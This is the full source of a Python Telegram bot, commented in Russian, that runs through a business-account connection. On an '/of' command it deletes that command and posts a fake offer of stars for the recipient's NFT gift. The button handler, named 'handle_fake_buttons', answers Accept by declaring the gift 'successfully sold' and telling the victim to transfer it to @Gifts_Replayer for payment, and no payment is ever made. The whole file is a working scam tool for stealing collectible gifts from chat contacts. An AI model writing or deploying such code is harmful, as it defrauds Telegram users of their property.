import asyncio
import os
import re
from aiogram import Bot, Dispatcher, types, F
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, LinkPreviewOptions
from aiogram.exceptions import TelegramBadRequest

BOT_TOKEN = os.getenv("BOT_TOKEN")

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

# Вспомогательная функция для красивого имени (DurovsCap-1234 -> Durovs Cap)
def get_pretty_name(slug):
    raw_name = slug.split('-')[0]
    return re.sub(r'(?<!^)(?=[A-Z])', ' ', raw_name)

@dp.business_message(F.text.startswith("/of"))
async def handle_offer_command(message: types.Message):
    business_connection_id = message.business_connection_id
    if not business_connection_id:
        return

    parts = message.text.split()
    if len(parts) < 3:
        return

    link = parts[1]
    try:
        amount = int(parts[2])
    except ValueError:
        return

    match = re.search(r"t\.me/nft/([a-zA-Z0-9_-]+-\d+)", link)
    if not match:
        return
    
    gift_slug = match.group(1)
    pretty_name = get_pretty_name(gift_slug)
    username = f"@{message.from_user.username}" if message.from_user.username else message.from_user.first_name

    try:
        # 1. Мгновенно удаляем команду
        await bot.delete_business_messages(
            business_connection_id=business_connection_id,
            message_ids=[message.message_id]
        )

        # 2. Текст сообщения
        caption_text = (
            f"Пользователь ({username})\n"
            f"предлагает вам\n"
            f"<b>{amount} ⭐</b> за подарок <a href='{link}'>{pretty_name}</a>."
        )

        # 3. Кнопки. В callback_data передаем действие, слаг и сумму
        # Формат: "accept:gift_slug:amount" или "decline:gift_slug:amount"
        keyboard = InlineKeyboardMarkup(inline_keyboard=[
            [
                InlineKeyboardButton(text="Отклонить", callback_data=f"decline:{gift_slug}:{amount}"),
                InlineKeyboardButton(text="Принять", callback_data=f"accept:{gift_slug}:{amount}")
            ]
        ])

        # 4. Отправляем сообщение с нативным превью
        await bot.send_message(
            chat_id=message.chat.id,
            text=caption_text,
            reply_markup=keyboard,
            business_connection_id=business_connection_id,
            parse_mode="HTML",
            link_preview_options=LinkPreviewOptions(
                url=link,
                show_above_text=True,
                prefer_large_media=True
            )
        )

    except Exception as e:
        print(f"Ошибка: {e}")

# --- ОБРАБОТКА НАЖАТИЙ НА КНОПКИ ---
@dp.callback_query(F.data.startswith("accept:") | F.data.startswith("decline:"))
async def handle_fake_buttons(callback: types.CallbackQuery):
    # Получаем ID бизнес-подключения из колбэка
    business_connection_id = callback.business_connection_id
    if not business_connection_id:
        await callback.answer("Ошибка: нет доступа к бизнес-чату.", show_alert=True)
        return

    data_parts = callback.data.split(":")
    action = data_parts[0]
    gift_slug = data_parts[1]
    amount = data_parts[2]

    link = f"https://t.me/nft/{gift_slug}"
    pretty_name = get_pretty_name(gift_slug)

    try:
        if action == "accept":
            # Если нажали "Принять"
            new_text = (
                f"🎁 <a href='{link}'>{pretty_name}</a> успешно продан!\n\n"
                f"• Передайте <a href='https://t.me/Gifts_Replayer'>@Gifts_Replayer</a> для зачисления звёзд."
            )
            
            # Кнопка "Передать NFT". Ссылка ведет прямо на подарок, 
            # откуда пользователь сможет его отправить.
            new_keyboard = InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="Передать NFT", url=link)]
            ])

        else:
            # Если нажали "Отклонить"
            new_text = f"❌ Оффер на <b>{amount} ⭐</b> за подарок <a href='{link}'>{pretty_name}</a> отклонен."
            new_keyboard = None # Убираем кнопки

        # Редактируем исходное сообщение
        await bot.edit_message_text(
            text=new_text,
            chat_id=callback.message.chat.id,
            message_id=callback.message.message_id,
            business_connection_id=business_connection_id,
            reply_markup=new_keyboard,
            parse_mode="HTML",
            link_preview_options=LinkPreviewOptions(is_disabled=True) # Отключаем превью для нового текста
        )
        await callback.answer() # Убираем "часики" на кнопке

    except TelegramBadRequest as e:
        # Если пользователь нажал дважды или сообщение уже изменено
        await callback.answer("Сообщение уже обработано.", show_alert=True)
    except Exception as e:
        print(f"Ошибка при обработке кнопки: {e}")
        await callback.answer("Произошла ошибка.", show_alert=True)

async def main():
    print("Бот запущен...")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
